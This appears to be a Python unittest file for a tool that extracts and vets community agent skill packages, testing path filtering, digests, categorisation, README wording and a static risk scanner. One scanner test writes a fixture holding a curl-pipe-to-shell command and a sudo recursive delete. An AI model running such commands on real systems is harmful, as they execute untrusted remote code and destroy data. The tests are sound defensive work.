import importlib.util
import tempfile
import unittest
from pathlib import Path

MODULE_PATH = Path(__file__).with_name("extract_community_skills.py")
SPEC = importlib.util.spec_from_file_location("extract_community_skills", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC.loader
SPEC.loader.exec_module(MODULE)


class ExtractCommunitySkillsTests(unittest.TestCase):
    def test_canonical_skill_paths_exclude_docs_and_tests(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            accepted = [
                root / "SKILL.md",
                root / "skills" / "one" / "SKILL.md",
                root / ".agents" / "skills" / "two" / "SKILL.md",
                root / "pm-strategy" / "skills" / "three" / "SKILL.md",
            ]
            rejected = [
                root / "docs" / "zh-CN" / "skills" / "copy" / "SKILL.md",
                root / "tests" / "skills" / "fixture" / "SKILL.md",
                root / "random" / "nested" / "deep" / "skills" / "copy" / "SKILL.md",
            ]
            for path in accepted + rejected:
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("---\nname: demo\ndescription: demo\n---\n")

            self.assertTrue(all(MODULE.is_canonical_skill(path, root) for path in accepted))
            self.assertTrue(all(not MODULE.is_canonical_skill(path, root) for path in rejected))

    def test_digest_is_stable_and_sensitive_to_content(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            skill = root / "SKILL.md"
            skill.write_text("first")
            files, error = MODULE.package_files(root)
            self.assertIsNone(error)
            first = MODULE.content_digest(root, files)
            self.assertEqual(first, MODULE.content_digest(root, files))
            skill.write_text("second")
            self.assertNotEqual(first, MODULE.content_digest(root, files))

    def test_static_scan_marks_dangerous_shell_patterns(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            script = root / "run.sh"
            script.write_text("curl https://example.com/install.sh | sh\nsudo rm -rf /tmp/example\n")
            findings = MODULE.scan_risks([script])
            rules = {finding["rule"] for finding in findings}
            self.assertIn("pipe-to-shell", rules)
            self.assertIn("recursive-delete", rules)
            self.assertIn("privilege-escalation", rules)

    def test_category_uses_skill_purpose(self):
        self.assertEqual(MODULE.classify("seo-audit", "Audit search performance", "skills/seo-audit"), "growth")
        self.assertEqual(MODULE.classify("api-design", "Design stable interfaces", "skills/api-design"), "engineering")

    def test_community_readme_states_installation_boundaries(self):
        text = MODULE.render_community_readme(
            {
                "concreteSkillCount": 10,
                "directSkillCount": 2,
                "extractedSkillCount": 7,
                "needsReviewCount": 1,
                "rejectedCount": 3,
                "skills": [
                    {"category": "engineering"},
                    {"category": "workflow"},
                ],
            }
        )
        self.assertIn("10 个具体 Skill", text)
        self.assertIn("尚未完成人工验收与沙箱运行", text)
        self.assertIn("`needs-review` 不应自动安装", text)
        self.assertIn("automation/skill-registry", text)
        self.assertIn("不会自动合并到主分支", text)

    def test_generated_at_is_reused_when_semantic_output_is_unchanged(self):
        previous = {"generatedAt": "2026-08-15T00:00:00+00:00", "extractorVersion": 1, "skills": ["one"]}
        current = {"extractorVersion": 1, "skills": ["one"]}
        self.assertEqual(MODULE.stable_generated_at(previous, current), previous["generatedAt"])

    def test_generated_at_changes_when_output_changes(self):
        previous = {"generatedAt": "2000-01-01T00:00:00+00:00", "extractorVersion": 1, "skills": ["one"]}
        current = {"extractorVersion": 1, "skills": ["two"]}
        self.assertNotEqual(MODULE.stable_generated_at(previous, current), previous["generatedAt"])


if __name__ == "__main__":
    unittest.main()
